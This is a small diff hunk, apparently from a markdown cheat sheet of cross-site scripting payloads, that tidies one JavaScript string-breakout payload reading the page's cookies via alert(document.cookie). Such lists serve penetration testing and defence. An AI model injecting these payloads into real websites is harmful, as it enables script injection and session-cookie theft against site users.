@@ -180,7 +180,7 @@ xss';alert(1);'xss
 '-alert(1)-'
 ```
 ```javascript
-';alert(document.cookie);'';
+';alert(document.cookie);'
 ```
 
 ---
